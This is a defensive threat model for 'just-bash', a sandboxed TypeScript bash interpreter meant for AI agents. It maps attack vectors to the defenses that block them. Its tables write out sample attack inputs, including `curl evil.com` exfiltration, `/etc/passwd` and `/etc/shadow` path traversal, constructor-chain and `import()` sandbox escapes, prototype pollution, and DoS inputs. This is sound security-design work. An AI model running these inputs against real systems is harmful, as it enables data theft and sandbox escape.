# just-bash Threat Model

## Context

just-bash is a TypeScript implementation of a bash interpreter with an in-memory virtual filesystem, designed for AI agents needing a secure, sandboxed bash environment. This document defines the full threat model: who the adversaries are, what they can target, what defenses exist, what gaps remain, and residual risks.

---

## 1. Threat Actors

### 1A. Untrusted Script Author (PRIMARY)
- **Who**: An AI agent or user submitting arbitrary bash scripts for execution
- **Capability**: Full control over the bash script input. Can craft any valid (or invalid) bash syntax
- **Goal**: Escape the sandbox, access the host filesystem, exfiltrate secrets, execute arbitrary code, cause denial of service, or escalate privileges
- **Trust level**: ZERO — the script is completely untrusted

### 1B. Malicious Data Source
- **Who**: External data consumed by scripts (HTTP responses, file content, stdin)
- **Capability**: Control over data that flows through expansion, variable assignment, command arguments
- **Goal**: Exploit the interpreter via crafted data (prototype pollution, injection via IFS, path traversal via filenames)
- **Trust level**: ZERO — data is untrusted

### 1C. Compromised Dependency
- **Who**: A supply-chain attacker modifying an npm dependency
- **Capability**: Arbitrary code execution at import time or via patched APIs
- **Goal**: Bypass sandbox from within the Node.js process
- **Trust level**: N/A — out of scope for runtime defenses but relevant for supply chain hardening

---

## 2. Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST PROCESS (Node.js)                                          │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ JUST-BASH SANDBOX                                         │  │
│  │                                                           │  │
│  │  ┌─────────────┐    ┌──────────────┐    ┌─────────────┐  │  │
│  │  │ Parser      │───▶│ AST          │───▶│ Interpreter │  │  │
│  │  │ (Lexer)     │    │              │    │             │  │  │
│  │  │ Limits:     │    │              │    │ Limits:     │  │  │
│  │  │ MAX_TOKENS  │    │              │    │ maxCmdCount │  │  │
│  │  │ MAX_INPUT   │    │              │    │ maxLoopIter │  │  │
│  │  │ MAX_DEPTH   │    │              │    │ maxCallDepth│  │  │
│  │  └─────────────┘    └──────────────┘    │ maxStrLen   │  │  │
│  │                                         └──────┬──────┘  │  │
│  │                                                │         │  │
│  │  ┌──────────────────┬──────────────────┬───────┴──────┐  │  │
│  │  │ Filesystem       │ Network          │ Commands     │  │  │
│  │  │ (InMemoryFs/     │ (Allow-list)     │ (Registry)   │  │  │
│  │  │  OverlayFs)      │ Default: OFF     │ ~79 built-in │  │  │
│  │  │ Symlinks: DENY   │                  │ No spawn()   │  │  │
│  │  └──────────────────┴──────────────────┴──────────────┘  │  │
│  │                                                           │  │
│  │  ┌───────────────────────────────────────────────────┐    │  │
│  │  │ Defense-in-Depth (SECONDARY)                      │    │  │
│  │  │ AsyncLocalStorage context-aware monkey-patching   │    │  │
│  │  │ Blocks: Function, eval, setTimeout, process.*     │    │  │
│  │  └───────────────────────────────────────────────────┘    │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Host filesystem, process.env, network, child_process           │
└─────────────────────────────────────────────────────────────────┘
```

**TB1 — Script Input → Parser**: User script is completely untrusted. Parser must handle any input without crashing, hanging, or leaking information.

**TB2 — Interpreter → Filesystem**: The interpreter issues filesystem operations. The FS layer must confine all access to the sandbox root, block symlink traversal, and prevent writes to the real filesystem.

**TB3 — Interpreter → Network**: Network access disabled by default. When enabled, URLs must pass the allow-list.

**TB4 — Interpreter → Host Process**: The interpreter must never spawn child processes, access host environment variables, or reach Node.js internals (process.binding, require, import()).

**TB5 — Data → Variable/Key Space**: User-controlled data becomes JS object keys (env vars, AWK variables, associative array keys). Must use null-prototype objects or Maps to prevent prototype pollution.

---

## 3. Attack Surface Inventory

### 3.1 Script Input (Parser)

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Token bomb | Script with pathological tokenization | MAX_TOKENS (100K) | `src/parser/types.ts` |
| Parser stack overflow | Deeply nested constructs | MAX_PARSER_DEPTH (200), MAX_PARSE_ITERATIONS (1M) | `src/parser/types.ts` |
| Oversized input | Very large scripts | MAX_INPUT_SIZE (1MB) | `src/parser/types.ts` |
| Heredoc bomb | Huge heredoc content | maxHeredocSize (10MB) | `src/limits.ts` |
| Malformed input | Invalid bash syntax | Parser returns errors, doesn't crash | `src/parser/parser.ts` |

### 3.2 Expansion & Substitution

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Brace expansion bomb | `{1..999999}` | maxBraceExpansionResults (10K) | `src/limits.ts` |
| Cmd substitution depth | `$($($($(…))))` | maxSubstitutionDepth (50) | `src/limits.ts` |
| String growth | `${x//a/aaaa}` in loop | maxStringLength (10MB) + mid-loop check | `src/interpreter/expansion/parameter-ops.ts` |
| Glob bomb | `**/*` across large FS | maxGlobOperations (100K) | `src/limits.ts` |
| Var indirection chain | `a=b; b=c; …` 100+ deep | Hardcoded depth > 100 check | `src/interpreter/arithmetic.ts` |
| IFS injection | Custom IFS to split commands | IFS only affects word splitting, not parsing | `src/interpreter/helpers/ifs.ts` |
| Arithmetic overflow | `$((2**63))` | Clamped to MAX_SAFE_INTEGER, no 64-bit | `src/parser/arithmetic-primaries.ts` |
| Division by zero | `$((1/0))` | ArithmeticError thrown | `src/interpreter/arithmetic.ts` |

### 3.3 Filesystem

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Path traversal | `../../etc/passwd` | Path normalization + root containment via `isPathWithinRoot()` | `src/fs/real-fs-utils.ts` |
| Symlink escape | Symlink pointing outside root | Default-deny (`allowSymlinks: false`) | `src/fs/overlay-fs/overlay-fs.ts` |
| Null byte injection | `file\x00.txt` | `validatePath()` rejects null bytes | `src/fs/real-fs-utils.ts` |
| TOCTOU race | Check-then-use timing gap | Gate returns canonical path for immediate use | `src/fs/real-fs-utils.ts` |
| Write to host FS | Persisting malicious files | OverlayFs writes to memory only | `src/fs/overlay-fs/overlay-fs.ts` |
| /proc /sys access | Reading host process info | Virtual FS doesn't expose real /proc | `src/fs/overlay-fs/overlay-fs.ts` |
| Broken symlink write | Write through broken symlink | Extra `lstat()` on leaf component | `src/fs/real-fs-utils.ts` |
| Real path disclosure | Error messages reveal host paths | `sanitizeError()` strips real paths from ErrnoException; `sanitizeSymlinkTarget()` strips absolute paths | `src/fs/overlay-fs/overlay-fs.ts`, `src/fs/real-fs-utils.ts` |

### 3.4 Network

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Arbitrary access | `curl evil.com` | Network disabled by default; curl only registered when NetworkConfig provided | `src/commands/registry.ts` |
| SSRF via redirects | Redirect to internal service | Each redirect validated against allow-list; manual redirect handling | `src/network/fetch.ts` |
| Response bomb | Huge response body | maxResponseSize (10MB) enforced via Content-Length and streaming | `src/network/fetch.ts` |
| Protocol restriction | Only http/https allowed | Allow-list rejects all other protocols | `src/network/allow-list.ts` |
| URL manipulation | `https://evil.com@good.com` | Full URL parsing via `new URL()` before matching | `src/network/allow-list.ts` |
| Header pollution | Malicious response headers | Response headers stored in `Object.create(null)` | `src/network/fetch.ts` |

### 3.5 Code Execution Escape

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Function constructor | `new Function("code")` | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| eval() | Direct/indirect eval | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| .constructor.constructor | `{}.constructor.constructor` | `Function.prototype.constructor` patched | `src/security/defense-in-depth-box.ts` |
| Async/Generator constructors | `async function(){}.constructor` | All async/generator function constructors patched | `src/security/defense-in-depth-box.ts` |
| setTimeout(string) | Code execution via string arg | setTimeout entirely blocked | `src/security/blocked-globals.ts` |
| process.binding() | Access native modules | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| process.dlopen() | Load native addons | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| Module._load() | CJS module loading | Blocked by defense-in-depth proxy | `src/security/defense-in-depth-box.ts` |
| process.mainModule | Access main module (CJS) | Blocked via defineProperty getter | `src/security/defense-in-depth-box.ts` |
| Error.prepareStackTrace | Leak Function via stack frames | Set blocked via defineProperty | `src/security/defense-in-depth-box.ts` |
| WebAssembly | Compile/run arbitrary code | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| Proxy constructor | Create intercepting proxies | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| WeakRef/FinalizationRegistry | GC observation/side channels | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| process.chdir() | Confuse CWD tracking | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
| **dynamic import()** | `import('/tmp/evil.js')` | **CANNOT BE BLOCKED** (see §4.1) | N/A |
| child_process | spawn/exec/fork | Not imported anywhere; no code path from interpreter | Architecture |

### 3.6 Information Disclosure

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| process.env | Leak API keys, secrets | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| process.argv | CLI args with secrets | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| process.execPath | Reveal Node.js path | Blocked via defineProperty | `src/security/defense-in-depth-box.ts` |
| process.connected | IPC connection status | Blocked via defineProperty (IPC contexts only) | `src/security/defense-in-depth-box.ts` |
| process.send | IPC messaging to parent | Blocked by defense-in-depth proxy (IPC contexts only) | `src/security/blocked-globals.ts` |
| process.channel | IPC channel access | Blocked by defense-in-depth proxy (IPC contexts only) | `src/security/blocked-globals.ts` |
| Host PID/UID | Expose process identity | Virtualized (processInfo option, defaults: pid=1, uid=1000) | `src/Bash.ts` |
| hostname/whoami/uname | System enumeration | Return generic/virtual values | `src/commands/hostname/` |
| Error messages | Reveal file paths | `sanitizeError()` in FS layers + `sanitizeErrorMessage()` at all error choke points (builtin-dispatch, Bash.ts, CLI, Python bridge) | `src/fs/real-fs-utils.ts`, `src/interpreter/builtin-dispatch.ts`, `src/Bash.ts`, `src/cli/just-bash.ts` |
| Timing side-channels | hrtime, cpuUsage, memoryUsage | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |

### 3.7 Denial of Service

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Infinite loop | `while true; do :; done` | maxLoopIterations (10K) | `src/limits.ts` |
| Fork bomb | Recursive function calls | maxCallDepth (100) | `src/limits.ts` |
| Command flood | Thousands of commands | maxCommandCount (10K) | `src/limits.ts` |
| Memory exhaustion | String/array growth | maxStringLength (10MB), maxArrayElements (100K) | `src/limits.ts` |
| Regex DoS (ReDoS) | Catastrophic backtracking | re2js (linear-time regex engine) | `src/regex/user-regex.ts` |
| process.exit() | Terminate host process | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| process.abort() | Crash host process | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| process.kill() | Signal host/other procs | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| AWK/SED loops | Runaway text processing | maxAwkIterations (10K), maxSedIterations (10K) | `src/limits.ts` |

### 3.8 Privilege Escalation

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| process.setuid() | Change user ID | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| process.setgid() | Change group ID | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| process.umask() | Modify file permissions | Blocked by defense-in-depth | `src/security/blocked-globals.ts` |
| chmod/chown | Change file permissions | Operates on virtual FS only | `src/commands/chmod/` |

### 3.9 Prototype Pollution

| Vector | Description | Defense | Files |
|--------|-------------|---------|-------|
| Environment variables | `__proto__`, `constructor` as var names | `Map<string, string>` for env storage | `src/Bash.ts`, `src/helpers/env.ts` |
| AWK variables | AWK field/var names | `Object.create(null)` throughout | `src/commands/awk/interpreter/context.ts` |
| Associative arrays | User-controlled keys | Null-prototype objects | `src/interpreter/` |
| JQ/query field access | JSON keys from data | `DANGEROUS_KEYS` Set + `safeGet()`/`safeSet()` | `src/commands/query-engine/safe-object.ts` |
| HTTP response headers | Header names from responses | `Object.create(null)` for header objects | `src/network/fetch.ts` |
| Env export to commands | Passing env to subprocesses | `mapToRecord()` produces null-prototype objects | `src/helpers/env.ts` |

---

## 4. Known Gaps & Residual Risks

### 4.1 CRITICAL: Dynamic import() Cannot Be Blocked

**Risk**: HIGH (but mitigated at other layers)

Dynamic `import()` is a language-level keyword, not a property on any object. It cannot be intercepted by Proxy, defineProperty, or any monkey-patching technique.

**Attack scenario**: If attacker achieves JS code execution → `import('data:text/javascript,...')` → full escape.

**Mitigations**:
1. OverlayFs writes to memory only — attacker cannot write .js files to real filesystem
2. InMemoryFs has no real filesystem backing at all
3. The bash interpreter never calls `import()` based on user input — no code path exists
4. All paths from bash to JS code execution (Function, eval, setTimeout, constructor chains) are blocked

**Residual risk**: If a bug in the interpreter allows JavaScript code execution (bypassing Function/eval blocks), `import()` becomes an unblockable escalation path. Node.js `--experimental-loader` hooks could intercept but are not currently used.

### 4.2 Pre-Captured References Bypass Defense-in-Depth

**Risk**: LOW (defense-in-depth is secondary)

If any code captures a reference to `Function`, `eval`, etc. **before** the defense-in-depth box is activated, that reference bypasses the proxy. This is documented and tested.

**Mitigation**: Defense-in-depth is a secondary layer. The primary defense is that no code path exists from bash interpretation to JavaScript execution.

### 4.3 globalThis Property Reassignment

**Risk**: LOW (defense-in-depth is secondary)

Attackers within the sandbox could overwrite `globalThis.Function` or use `Object.defineProperty` to replace blocking proxies. This is documented and tested.

**Mitigation**: Same as §4.2 — relies on no code path existing, not on the monkey-patching being unbypassable.

### 4.4 Signal/Job Control Not Fully Modeled

**Risk**: LOW

Bash `trap` command has limited security testing. Background job control (`&`, `fg`, `bg`) not systematically tested.

**Mitigation**: just-bash doesn't spawn real processes, so signals/jobs operate within the virtual model only.

### 4.5 Unicode/Encoding Edge Cases

**Risk**: LOW

No systematic testing for invalid UTF-8, homograph attacks, or RTL override characters. These are display/confusion attacks, not execution escape vectors.

### 4.6 File Descriptor Manipulation

**Risk**: LOW

No tests for `/dev/fd/` access. The virtual filesystem doesn't implement `/dev/fd/`.

### 4.7 Python Execution Surface (When Enabled)

**Risk**: HIGH (intentional, opt-in)

When `python: true`, Pyodide provides full Python execution. This significantly expands the attack surface.

**Mitigations**:
- Disabled by default; must be explicitly enabled
- 30-second timeout (`maxPythonTimeoutMs`)
- Runs in a separate `Worker` thread with `WorkerDefenseInDepth`
- Python-level sandbox blocks `js`, `pyodide`, `pyodide_js`, `pyodide.ffi` imports
- Dangerous module attributes (`__closure__`, `__globals__`, `__kwdefaults__`) hidden
- Some defense-in-depth exclusions required for Pyodide internals (`proxy`, `setImmediate`, `shared_array_buffer`, `atomics`)

### 4.8 Error Message Information Leakage

**Risk**: LOW (mitigated)

Error sanitization is now systematic: `sanitizeError()` in FS layers (OverlayFs, ReadWriteFs) strips `.path` from `ErrnoException` objects, and `sanitizeErrorMessage()` strips OS paths and stack traces from raw error messages at all major choke points (builtin-dispatch catch-all, `Bash.exec()` error handlers, CLI error outputs, Python FS bridge). Remaining risk is limited to custom commands that catch and re-format errors without using the sanitization function.

### 4.9 Heredoc Expansion Interaction

**Risk**: LOW

Heredocs with variable expansion are size-limited (10MB) but nested heredocs with complex expansion haven't been exhaustively fuzzed.

### 4.10 Reflect Object Frozen But Available

**Risk**: LOW

`Reflect` is frozen (not blocked) in the defense-in-depth layer. `Reflect.construct`, `Reflect.apply` etc. remain callable but cannot construct `Function` directly because the `Function` constructor itself is blocked.

---

## 5. Defense Layer Summary

| Layer | Type | Scope | Bypass Difficulty |
|-------|------|-------|-------------------|
| **Architecture** (no child_process import) | Primary | Code execution | Very High — no code path exists |
| **Filesystem** (OverlayFs/InMemoryFs) | Primary | File access | High — central gate functions (`resolveCanonicalPath`) |
| **Symlink blocking** (default-deny) | Primary | Path traversal | High — zero-extra-I/O validation via path comparison |
| **Network allow-list** | Primary | Network access | High — default-off, per-redirect validation |
| **Command registry** | Primary | Command execution | High — only registered JS implementations run |
| **Execution limits** | Primary | DoS | High — enforced at every loop/call/expansion |
| **Prototype pollution guards** | Primary | Data integrity | Medium — requires discipline across all new code |
| **Parser limits** | Primary | Parser DoS | High — token/depth/size/iteration limits |
| **re2js regex engine** | Primary | ReDoS | High — linear-time guarantee (no backtracking) |
| **Defense-in-depth** (globals) | Secondary | JS escape | Medium — monkey-patching has inherent limits |
| **Virtual process info** | Secondary | Info disclosure | High — no real values exposed |
| **Error sanitization** | Secondary | Info disclosure | High — systematic at FS layers + all error choke points |

---

## 6. Threat Scenarios & Verdicts

| # | Scenario | Path | Verdict |
|---|----------|------|---------|
| 1 | Read /etc/passwd | `cat /etc/passwd` → OverlayFs → not under root → ENOENT | **BLOCKED** (primary FS) |
| 2 | Symlink escape | `ln -s /etc/passwd x` → allowSymlinks=false → EPERM | **BLOCKED** (symlink policy) |
| 3 | Access process.env | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
| 4 | Infinite loop | `while true; do :; done` → maxLoopIterations → throw | **BLOCKED** (limits) |
| 5 | Prototype pollution | `arr[__proto__]=evil` → Map/null-prototype → no effect | **BLOCKED** (data guards) |
| 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` | **RESIDUAL RISK** (no path exists today) |
| 7 | Network exfiltration | `curl evil.com` → network off → curl not registered | **BLOCKED** (network isolation) |
| 8 | process.exit() | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
| 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → truncated | **BLOCKED** (limits) |
| 10 | Python escape | Python off by default. If on: worker + defense + virtual FS | **RESIDUAL RISK** (opt-in) |
| 11 | ReDoS via user regex | `[[ str =~ evil_pattern ]]` → re2js → linear-time match | **BLOCKED** (re2js) |
| 12 | Path traversal | `cat ../../etc/shadow` → normalize → `isPathWithinRoot()` → ENOENT | **BLOCKED** (primary FS) |
| 13 | Null byte injection | `cat "file\x00../../etc/passwd"` → `validatePath()` → rejected | **BLOCKED** (path validation) |
| 14 | Error path leak | FS error with real path → `sanitizeError()` → path stripped | **BLOCKED** (error sanitization) |
| 15 | Constructor chain | `({}).constructor.constructor('code')()` → constructor patched → throw | **BLOCKED** (defense-in-depth) |

---

## 7. Recommendations for Future Hardening

1. **`--experimental-loader` for import() blocking** — Use Node.js module resolution hooks to intercept and block dynamic imports within sandbox contexts
2. ~~**Systematic error message audit**~~ — **IMPLEMENTED**: `sanitizeErrorMessage()` applied at all error choke points; strips OS paths and stack traces
3. **Content Security Policy for output** — Consider sanitizing output to prevent XSS when sandbox output is rendered in web contexts
4. **Expand fuzzing corpus** — Add grammar rules for trap, job control (`&`, `fg`, `bg`), and deeply nested heredocs with expansion
5. **Total memory ceiling** — Track total memory allocated per `exec()` call to provide a hard memory ceiling (not just per-object limits)
6. ~~**process.connected / process.send / process.channel**~~ — **IMPLEMENTED**: Blocked via defense-in-depth (proxy for send/channel, defineProperty for connected)
7. ~~**process.chdir**~~ — **IMPLEMENTED**: Blocked via defense-in-depth proxy
